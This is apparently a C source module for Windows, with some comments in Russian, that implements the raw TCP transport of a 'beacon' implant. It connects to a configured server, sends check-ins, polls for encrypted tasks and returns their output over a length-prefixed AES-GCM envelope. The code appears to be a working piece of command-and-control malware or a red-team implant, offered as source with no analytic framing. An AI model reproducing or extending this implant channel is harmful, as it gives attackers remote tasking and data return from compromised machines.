// Raw TCP transport. Persistent socket; envelope: [u32 BE len][u8 type][payload].
// payload — sealed AES-GCM frame (или пусто для poll).
//
// Маршруты VTbl:
//   checkin()       — type=TPORT_CHECKIN, ждём ответ TPORT_CHECKIN.
//   poll_tasks()    — type=TPORT_POLL без тела, ждём TPORT_TASKS.
//   submit_output() — type=TPORT_OUTPUT, ждём TPORT_ACK (тело пустое).

#include "../../core/beacon.h"
#include <winsock2.h>
#include <ws2tcpip.h>

static SOCKET g_sock = INVALID_SOCKET;
static int    g_wsa_init = 0;

static void tcp_close_socket(void) {
    if (g_sock != INVALID_SOCKET) {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }
}

static int tcp_ensure_wsa(void) {
    if (g_wsa_init) return 0;
    WSADATA wd;
    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) return -1;
    g_wsa_init = 1;
    return 0;
}

static int tcp_connect_if_needed(void) {
    if (g_sock != INVALID_SOCKET) return 0;
    if (tcp_ensure_wsa() != 0) { bdbg("[tcp] WSAStartup failed\n"); return -1; }

    BeaconState* st = beacon_state();

    // host[] is wide; convert to UTF-8 for getaddrinfo.
    char hostA[256] = {0};
    int wlen = (int)rt_wstrlen(st->host);
    int n = WideCharToMultiByte(CP_UTF8, 0, st->host, wlen, hostA, sizeof(hostA) - 1, NULL, NULL);
    if (n <= 0) { bdbg("[tcp] WideCharToMultiByte failed\n"); return -1; }
    hostA[n] = 0;

    char portA[8]; int pn = 0;
    uint16_t pv = st->port;
    if (!pv) portA[pn++] = '0';
    else { char t[8]; int m = 0; while (pv) { t[m++] = (char)('0' + pv % 10); pv /= 10; } while (m) portA[pn++] = t[--m]; }
    portA[pn] = 0;

    bdbg("[tcp] connecting to "); bdbg(hostA); bdbg(":"); bdbg(portA); bdbg("\n");

    struct addrinfo hints; rt_memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    struct addrinfo* res = NULL;
    if (getaddrinfo(hostA, portA, &hints, &res) != 0 || !res) {
        bdbg("[tcp] getaddrinfo failed\n"); return -1;
    }

    SOCKET s = INVALID_SOCKET;
    for (struct addrinfo* it = res; it; it = it->ai_next) {
        s = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        if (connect(s, it->ai_addr, (int)it->ai_addrlen) == 0) break;
        closesocket(s);
        s = INVALID_SOCKET;
    }
    freeaddrinfo(res);
    if (s == INVALID_SOCKET) { bdbg("[tcp] connect failed\n"); return -1; }
    bdbg("[tcp] connected\n");

    DWORD tmo = 30000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tmo, sizeof(tmo));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tmo, sizeof(tmo));
    int one = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char*)&one, sizeof(one));

    g_sock = s;
    return 0;
}

static int tcp_send_all(const uint8_t* p, size_t n) {
    while (n) {
        int sent = send(g_sock, (const char*)p, (int)(n > 0x10000 ? 0x10000 : n), 0);
        if (sent <= 0) { tcp_close_socket(); return -1; }
        p += sent; n -= (size_t)sent;
    }
    return 0;
}

static int tcp_recv_all(uint8_t* p, size_t n) {
    while (n) {
        int got = recv(g_sock, (char*)p, (int)(n > 0x10000 ? 0x10000 : n), 0);
        if (got <= 0) { tcp_close_socket(); return -1; }
        p += got; n -= (size_t)got;
    }
    return 0;
}

// Send envelope [u32 be len][u8 type][payload].
static int tcp_send_env(uint8_t type, const uint8_t* body, size_t body_len) {
    if (tcp_connect_if_needed() != 0) return -1;
    uint32_t total = (uint32_t)(1 + body_len);
    uint8_t hdr[5];
    hdr[0] = (uint8_t)(total >> 24);
    hdr[1] = (uint8_t)(total >> 16);
    hdr[2] = (uint8_t)(total >>  8);
    hdr[3] = (uint8_t) total;
    hdr[4] = type;
    if (tcp_send_all(hdr, 5) != 0) return -1;
    if (body_len && tcp_send_all(body, body_len) != 0) return -1;
    return 0;
}

// Receive envelope. Writes payload into out (capacity *out_len on entry).
// On success returns 0 and sets *out_type, *out_len. Returns -1 (and closes
// the socket) on I/O error or if the body does not fit into the caller buffer.
static int tcp_recv_env(uint8_t* out_type, uint8_t* out, size_t* out_len) {
    uint8_t hdr[5];
    if (tcp_recv_all(hdr, 5) != 0) return -1;
    uint32_t total = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16)
                   | ((uint32_t)hdr[2] <<  8) |  (uint32_t)hdr[3];
    if (total < 1 || total > 16u * 1024u * 1024u) { tcp_close_socket(); return -1; }
    *out_type = hdr[4];
    size_t body = total - 1;
    if (body > *out_len) { tcp_close_socket(); return -1; }
    if (body && tcp_recv_all(out, body) != 0) return -1;
    *out_len = body;
    return 0;
}

// ---- vtable -----------------------------------------------------------------

static int tcp_checkin(const uint8_t* frame, size_t flen,
                       uint8_t* out, size_t* out_len) {
    if (tcp_send_env(TPORT_CHECKIN, frame, flen) != 0) { *out_len = 0; return -1; }
    uint8_t typ = 0;
    if (tcp_recv_env(&typ, out, out_len) != 0) { *out_len = 0; return -1; }
    if (typ != TPORT_CHECKIN) { *out_len = 0; return -1; }
    return 0;
}

static int tcp_poll(uint8_t* out, size_t* out_len) {
    if (tcp_send_env(TPORT_POLL, NULL, 0) != 0) { *out_len = 0; return -1; }
    uint8_t typ = 0;
    if (tcp_recv_env(&typ, out, out_len) != 0) { *out_len = 0; return -1; }
    if (typ != TPORT_TASKS) { *out_len = 0; return -1; }
    return 0;
}

static int tcp_submit(const uint8_t* frame, size_t flen) {
    if (tcp_send_env(TPORT_OUTPUT, frame, flen) != 0) return -1;
    uint8_t scratch[16]; size_t slen = sizeof(scratch);
    uint8_t typ = 0;
    if (tcp_recv_env(&typ, scratch, &slen) != 0) return -1;
    return (typ == TPORT_ACK && slen == 0) ? 0 : -1;
}

static int tcp_connection_lost(void) { return g_sock == INVALID_SOCKET; }

const TransportVtbl g_transport_tcp = {
    .checkin         = tcp_checkin,
    .poll_tasks      = tcp_poll,
    .submit_output   = tcp_submit,
    .connection_lost = tcp_connection_lost,
};
